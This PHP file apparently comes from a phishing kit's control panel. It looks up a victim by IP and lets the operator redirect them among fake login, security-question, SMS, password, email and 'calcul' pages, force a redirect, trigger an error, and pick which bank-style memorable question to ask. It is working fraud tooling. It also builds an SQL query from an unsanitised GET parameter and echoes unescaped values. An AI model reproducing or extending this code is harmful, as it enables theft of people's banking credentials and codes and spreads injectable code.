<?php
   class MyDB extends SQLite3 {
      function __construct() {
         $this->open('db.db');
      }
   }
   $db = new MyDB();
   if(!$db) {
      echo $db->lastErrorMsg();
   } else {
      //echo "Opened database successfully\n";
   }



$userip =$_GET['ip'];

   $sql ="SELECT * from user where IP='$userip';";

   $ret = $db->query($sql);
   while($row = $ret->fetchArray(SQLITE3_ASSOC) ) {
      $ip =$row['IP'];
      $page =$row['page'];
$question =$row['question'];
$forcere =$row['forcere'];



?>

<div class="card">
                                    <div class="card-header">
                                        <strong>IP :  </strong><?php echo $ip;?> </div>
                                    <div class="card-body card-block">
                                        <form action="" method="post"class="form-horizontal">
                                          <input type="hidden" name="ipmodel" value="<?php echo $ip;?>">




                                            
                                  




<div class="row form-group">
                                                <div class="col col-md-3">
                                                    <label for="select" class=" form-control-label">Page</label>
                                                </div>
                                                <div class="col-12 col-md-9">
                                                    <select name="page" id="select" class="form-control">

                                                        <option value="<?php echo $page;?>"><?php echo $page;?></option> 
                                        <option value="index.php">login</option>
                                        <option value="pin.php">question</option>
                                         <option value="sms.php">sms</option>
                                         <option value="pass.php">pass</option>
                                         <option value="email.php">email</option>
                                         <option value="calcul.php">calcul</option>
                                         <option value="calcul_pro.php">calcul_pro</option>
                                          <option value="delete_dir.php">final</option>
                                                                                
                                                    </select>
                                                     <input type="checkbox" id="error" name="error" value="yes">
                                        <label for="error"> show error</label>
                                                </div>
                                            </div><div class="row form-group">
                                                <div class="col col-md-3">
                                                    <label class=" form-control-label">question</label>
                                                </div>
                                             
<div class="col-12 col-md-9">

    <select name="question" id="select" class="form-control">

                       <option value="<?php echo $question;?>"><?php echo $question;?></option> 
                       
                       <option id="memquestion1" value="What is your eldest child&acute;s middle name?">What is your eldest child's middle name?</option>
               
                <option id="memquestion2" value="Who was your first employer?">Who was your first employer?</option>
               
                <option id="memquestion3" value="What is your father&acute;s middle name?">What is your father's middle name?</option>
               
                <option id="memquestion4" value="What is the name of the street you grew up on?">What is the name of the street you grew up on?</option>
               
                <option id="memquestion5" value="What was the name of your first school?">What was the name of your first school?</option>
               
                <option id="memquestion6" value="Name a memorable character from a film or a book or TV">Name a memorable character from a film or a book or TV ?</option>
               
                <option id="memquestion7" value="What is the make and model of your first car?">What is the make and model of your first car?</option>
               
                <option id="memquestion8" value="Name a memorable meal">Name a memorable meal</option>
               
                <option id="memquestion9" value="Name a memorable restaurant">Name a memorable restaurant</option>
               
                <option id="memquestion10" value="What is your memorable answer?">What is your memorable answer?</option>
                                            
                                                    </select>
                                                  </div>
                                            </div>


                    <div class="row form-group">
      <div class="col col-md-3">
        <label for="select" class=" form-control-label">Froce redirect</label>
                                                </div>
            <div class="col-12 col-md-9">
      <select name="forcere" id="select" class="form-control">

     <option value="<?php echo $forcere;?>"><?php echo $forcere;?></option> 
     <option value="pin.php">question</option>
     <option value="sms.php">sms</option>
     <option value="email.php">email</option>
     <option value="calcul.php">calcul</option>
      <option value="calcul_pro.php">calcul_pro</option>
                                            
                                                    </select>
                                                </div>
                                            </div>
                                            


   

                                            <div class="row form-group">
                     <button type="submit" name="submitmodel" class="btn btn-primary">Valider</button>


                                                                                </div>




                                        </form>
                                    </div>

                                </div>


                                <?php   }


?>